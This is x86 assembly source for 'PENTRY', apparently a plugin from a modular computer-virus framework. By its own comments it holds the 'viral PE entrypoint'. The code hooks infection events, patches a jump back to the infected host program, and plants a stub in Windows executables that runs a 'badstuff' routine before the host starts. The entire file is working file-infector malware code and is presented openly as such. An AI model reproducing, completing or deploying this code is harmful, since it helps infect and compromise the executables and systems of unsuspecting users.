   ; PENTRY
   ; ~~~~~~
   ; - contains viral PE entrypoint & startup event caller
   ; - contains JMP to original entry point

   include                 system.inc
   include                 unprot.inc

   include                 plugin.inc
                           PLUGIN_START    PENTRY, CODE32, NON_PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, pentry_disable
                           hookevent EV_PENTRY_PREPARE2INFECT, pentry_prepare
                           stc
                           retn

   pentry_prepare:         mov     edx, EV_PENTRY_BASE
                           event   EV_SYSTEM_GET_PLUGIN_OFFS ; eax=pentry

                           ; patch JMP's arg
                           sub     esi, eax
                           sub     esi, pop_addr-plugin_start - (size plugin_struc)
                           mov     [eax+loaderdelta-plugin_start], esi

                           lea     esi, [ecx+pe_entry-plugin_start]
                           lea     edi, [ecx+jmp2host-plugin_start]

                           mov     byte ptr [eax+entry_status-plugin_start], entry_enabled

                           clc
                           retn

   pentry_disable:         pusha

                           event   EV_UNPROT_ME

                           mov     edx, EV_PENTRY_BASE
                           event   EV_SYSTEM_GET_PLUGIN_OFFS ; eax=pentry
                           mov     byte ptr [eax+entry_status-plugin_start], entry_disabled

                           popa
                           stc     ; keep event
                           retn

   entry_enabled           equ     0E8h    ; call
   entry_disabled          equ     03Dh    ; cmp eax

   pe_entry:
                           mov     ecx, 100000
   __cycle:                inc     edx
                           dec     ecx
                           jnz     __cycle

           ; we need the following byte to be changed, 'coz of
           ; multiple DLL_entry calls.
   entry_status            label   byte
                           call    badstuff        ; call/cmp eax, ...
   pop_addr:
                           db      0E9h
   jmp2host                dd      0
                           retn

   badstuff:               pusha

                           mov     ebp, [esp+32]      ; @pop_addr
                           add     ebp, 12345678h
   loaderdelta             equ     dword ptr $-4

                           event   EV_PENTRY_START_IN_PE

                           popa
                           retn

                           PLUGIN_END
